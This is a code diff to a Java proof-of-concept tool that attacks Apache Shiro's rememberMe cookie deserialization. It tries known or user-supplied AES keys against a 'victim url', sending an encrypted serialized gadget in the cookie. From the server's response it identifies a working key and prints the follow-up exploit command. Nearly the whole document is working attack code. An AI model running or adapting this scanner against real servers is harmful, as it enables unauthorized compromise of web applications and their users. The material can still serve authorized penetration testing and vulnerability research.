@@ -1,6 +1,7 @@
 package org.unicodesec;
 
 
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import org.apache.http.Header;
 import org.apache.http.HttpHeaders;
 import org.apache.http.client.methods.CloseableHttpResponse;
@@ -29,8 +30,11 @@ public class poc {
         System.out.println(text);
         if (args.length == 0) {
             System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
+            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url] shiroKey");
             System.out.println("eg:");
-            System.out.println("    " + "java -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro\n");
+            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro\n");
+            System.out.println("如果你想使用自定义shiro key检测，请使用如下命令");
+            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro kPH+bIxk5D2deZiIxcaaaA==\n");
             System.err.println("  Available shiro key:");
 
             final List<String[]> rows = new LinkedList<String[]>();
@@ -51,39 +55,55 @@ public class poc {
         }
 
         String victimUrl = args[0];
-        CloseableHttpClient httpclient = HttpClients.createDefault();
-        for (int i = 0; i < keys.keys.length; i++) {
-            byte[] bytes = MakeGadget();
-            String rememberMe = EncryptUtil.shiroEncrypt(keys.keys[i], bytes);
-            HttpGet request = new HttpGet(victimUrl);
-            request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
-            request.setHeader("Cookie", "rememberMe=" + rememberMe);
-            CloseableHttpResponse response = httpclient.execute(request);
-            if (response.getStatusLine().getStatusCode() == 200) {
-                boolean isDeleteMe = false;
-                for (Header h : response.getAllHeaders()) {
-                    if (h.getName().toLowerCase().contains("set-cookie")) {
-                        if (h.getValue().contains("rememberMe=deleteMe")) {
-                            isDeleteMe = true;
-                        }
-                    }
-                }
-                if (isDeleteMe == false) {
-                    System.out.println(String.format("found Shiro Vulnerability, Shiro key %s", keys.keys[i]));
-                    System.out.println(String.format("Shiro key index %s", i));
-                    System.out.println("use this command to exploit shiro:");
-                    System.out.println(String.format("\tjava -jar shiroPoc-[version]-all.jar keyIndex [payload] [exploit type]", i));
-                    return;
-                }
+        String key = "";
+        if (args.length == 2){
+            key = args[1];
+            if (Base64.decode(key).length != 16){
+                System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
             }
-
-
-            response.close();
+        }
+        CloseableHttpClient httpclient = HttpClients.createDefault();
+        if (key.length() >0){
+            if (detectShiroVuln(victimUrl, httpclient, key)) return;
+        }
+        else{
+            for (int i = 0; i < keys.keys.length; i++) {
+                if (detectShiroVuln(victimUrl, httpclient, keys.keys[i])) return;
+            }
         }
 
         System.out.println(String.format("not found Shiro Vulnerability,"));
 
 
+    }
+
+    private static boolean detectShiroVuln(String victimUrl, CloseableHttpClient httpclient, String key) throws Exception {
+        byte[] bytes = MakeGadget();
+        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
+        HttpGet request = new HttpGet(victimUrl);
+        request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
+        request.setHeader("Cookie", "rememberMe=" + rememberMe);
+        CloseableHttpResponse response = httpclient.execute(request);
+        if (response.getStatusLine().getStatusCode() == 200) {
+            boolean isDeleteMe = false;
+            for (Header h : response.getAllHeaders()) {
+                if (h.getName().toLowerCase().contains("set-cookie")) {
+                    if (h.getValue().contains("rememberMe=deleteMe")) {
+                        isDeleteMe = true;
+                    }
+                }
+            }
+            if (isDeleteMe == false) {
+                System.out.println(String.format("found Shiro Vulnerability, Shiro key %s", key));
+                System.out.println("use this command to exploit shiro:");
+                System.out.println(String.format("\tjava -jar shiroPoc-[version]-all.jar %s [payload] [exploit type]", key));
+                return true;
+            }
+        }
+
+
+        response.close();
+        return false;
     }
 
     private static byte[] MakeGadget() throws Exception {
